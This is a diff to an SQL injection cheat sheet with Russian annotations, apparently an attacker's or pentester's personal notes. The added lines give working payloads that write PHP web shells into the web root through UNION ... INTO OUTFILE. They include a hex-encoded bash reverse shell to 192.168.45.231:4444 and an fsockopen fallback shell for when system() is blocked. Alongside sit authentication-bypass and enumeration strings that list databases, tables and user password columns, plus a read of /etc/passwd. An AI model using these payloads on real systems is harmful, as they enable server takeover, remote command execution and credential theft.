@@ -266,9 +266,14 @@ select sleep(3)
 select count(*) from <tablename>; -- // количество колонок
 select load_file('/etc/passwd')  -- // чтение файла (нужны права)
 ' union select ' \"<?php system(\$_GET['cmd']);?>\"' into outfile '/var/www/html/tmp/webshell.php'  -- //
+' union select 'a', 'b', 'c', 'd', 0x3c3f7068702073797374656d282262617368202d63202762617368202d69203e26202f6465762f7463702f3139322e3136382e34352e3233312f3434343420303e26312722293b203f3e, 'f' into outfile '/var/www/html/webshell.php' -- "
+	reverse shell в hex: <?php system("bash -c 'bash -i >& /dev/tcp/192.168.45.231/4444 0>&1'"); ?>
+' UNION SELECT "<?php $sock=fsockopen('192.168.45.231',4444);exec('/bin/sh -i <&3 >&3 2>&3'); ?>" INTO OUTFILE '/var/www/html/shell.php' -- //
+	если system() заблокирована
 ' union select ' \"<?php system(\$_GET['cmd']);?>\"' into outfile 'C:\\Windows\\Temp\\shell.php' -- //
 	запись в файл (нужны права, файл не должен существовать), проверять количество столбцов не обязательно, но желательно
 ' or 1=1 -- //	хотя бы 1 пробел после --
+' or '1'='1 	для того, чтобы не ломать запрос и не коментить конец запроса	
 ' or 1=1 in (select version()) -- //
 ' or 1=1 in (select database()) -- // текущая БД
 ' or 1=1 in (select schema_name from information_schema.schemata) -- // все БД
@@ -278,6 +283,7 @@ select load_file('/etc/passwd')  -- // чтение файла (нужны права)
 
 ' ORDER BY 6-- // проверить количество колонок в используемом запросе - надо выровнять с количеством колонок в основном запросе
 %' UNION SELECT null, database(), user(), version(), null -- // % - любое количество любых символ (_ - 1 символ)
+' UNION select 1, 2, 3, 4, schema_name, 6 from information_schema.schemata -- // список всех БД
 ' UNION select null, table_name, database(), null, null		from information_schema.tables 	WHERE table_schema=database() -- //
 ' UNION select null, table_name, column_name, null, null	from information_schema.columns	WHERE table_name='users' -- //
 ' UNION select null, id, username, password, description 	from users -- //
